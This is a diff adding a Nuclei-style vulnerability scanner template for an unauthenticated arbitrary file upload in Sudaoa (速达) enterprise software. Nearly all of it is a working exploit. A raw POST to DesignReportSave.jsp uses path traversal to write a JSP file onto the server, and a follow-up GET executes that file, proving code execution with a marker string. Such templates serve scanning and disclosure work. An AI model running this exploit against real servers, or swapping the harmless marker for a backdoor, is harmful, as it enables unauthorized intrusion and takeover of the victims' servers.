@@ -1,0 +1,32 @@
+id: sudaoa-DesignReportSave-upload
+info:
+  name: sudaoa-DesignReportSave-upload
+  author: apple
+  severity: critical
+  description: 速达软件专注中小企业管理软件,产品涵盖进销存软件,财务软件,ERP软件,CRM系统,项目管理软件,OA系统,仓库管理软件等,是中小企业管理市场的佼佼者,提供产品、技术、服务等信息,百万企业共同选择。速达软件全系产品存在任意文件上传漏洞，未经身份认证得攻击者可以通过此漏洞上传恶意后门文件，执行任意指令，造成服务器失陷.
+  reference:
+    - https://github.com/wy876/POC/blob/main/速达软件全系产品存在任意文件上传漏洞.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /report/DesignReportSave.jsp?report=../625248.jsp HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/octet-stream
+        Content-Length: 28
+
+        <% out.print("984969719");%>
+      - |-
+        GET /625248.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '984969719'
